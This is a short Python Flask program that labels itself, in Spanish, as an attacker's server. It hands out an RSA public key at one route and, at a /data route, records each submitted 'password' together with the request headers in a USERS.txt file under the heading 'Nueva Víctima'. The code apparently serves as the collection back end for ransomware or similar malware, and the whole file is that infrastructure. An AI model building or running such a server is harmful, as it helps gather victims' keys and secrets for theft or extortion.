from flask import Flask
from flask import request

app = Flask(__name__)

@app.route('/')
def hello_world():
    return """
    <center>
    <h1>Esto es el servidor del atacante!!!</h1>
    <img src="https://c.tenor.com/YrTMShvtLPYAAAAC/tenor.gif" alt="malware">
    </center>

    """

@app.route('/rsa')
def rsa():
    return """-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAwAcNaB8VmTM9D39aj+KO
Lw4i8UyJ91xjh1bv1Btj+hqFQYydFzOTkPiDKI/4lMLzgFl5A1Dg1W1ltaAanSXW
uCWjKcYyxXrgwkrdGVFBVqFfYWu5aCVywYiexUTBuDtSixEao81mvUzUsfrYCYGv
pOxO3ZYZRqgePtPv6Gpsjbtyz9hidh9k7wgvqQDJU4XQyyRjnj029WfL2+26o/+5
9wOuNTBY7BC/2Do8uvahh4Ecmy16CGzHdzq2sL6dS5DkXr1NtYLZkxJnX9hhBfSl
iosoocGlV7QGGQi84IJZu7OpkFSZnXo9W7lVux6YJUTg42RXrtgTeFIljzLmha42
FyTsKSDOBO/J4WNG39U9WSRzKZ4H8f/a8IO4uYpGa1QMw8lmC3DYNsT4E5luwycQ
PzzisodHs4UDUuZTrboZuI9MgxhgxpHSiOZumaSsz6LGDL4ylLA/DsWQrDSEQ8HO
K99Aq2LdZWXs/v5pQAjluz0oKvTrl7xRNKCaHQ9AjsaI8mCguzJTUTbJL7QhUWzn
5Nxofq/XnWbLoOQ87n9FJ/+PNXBXMnIgTIhOYMTJEvuJt1CrGI+Zbd16Hmf3SVpT
7ms/FE3B6kcJupxdWiHnkn4RxlgiTIkoy8IryZm6uwgfSUPl1aIlD64lEjM4oxOW
NxCgVtSGAJcIFrShUU0QKnsCAwEAAQ==
-----END PUBLIC KEY-----

    """

@app.route('/data',methods = ['POST', 'GET'])
def data():
    if request.method == 'POST':
        password = request.form['password']
        headers= dict(request.headers)

        savefile=open("USERS.txt", "a")
        savefile.write(" \nNueva Víctima:\n\n"+str(headers)+"\n\n Password: "+ str(password)+ "\n\n------------------------------")
        savefile.close()
        return '[+]'
    else:
        return '[-]'
